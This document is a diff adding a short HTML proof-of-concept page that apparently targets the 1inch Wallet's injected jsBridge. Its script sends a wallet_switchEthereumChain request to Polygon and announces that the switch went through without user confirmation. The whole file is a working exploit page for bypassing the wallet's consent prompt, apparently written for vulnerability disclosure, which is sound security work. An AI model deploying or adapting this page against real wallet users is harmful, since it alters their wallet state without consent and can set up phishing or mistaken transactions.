@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>1inch Wallet - Silent Chain Switch PoC</title></head>
+<body>
+<h2>1inch Wallet - Silent Chain Switch PoC</h2>
+<p id="status">Attempting wallet_switchEthereumChain to Polygon (0x89)...</p>
+<script>
+try {
+    if (window.jsBridge && window.jsBridge.postEvmMessage) {
+        window.jsBridge.postEvmMessage(JSON.stringify({
+            method: "wallet_switchEthereumChain",
+            params: [{chainId: "0x89"}],
+            jsonrpc: "2.0",
+            id: 1
+        }));
+        document.getElementById("status").innerHTML = "<b>SUCCESS:</b> Chain switch to Polygon (0x89) sent WITHOUT user confirmation!";
+    } else {
+        document.getElementById("status").innerHTML = "jsBridge NOT available - bridge not injected for this origin";
+    }
+} catch(e) {
+    document.getElementById("status").innerHTML = "<b>ERROR:</b> " + e.message;
+}
+</script>
+</body>
+</html>
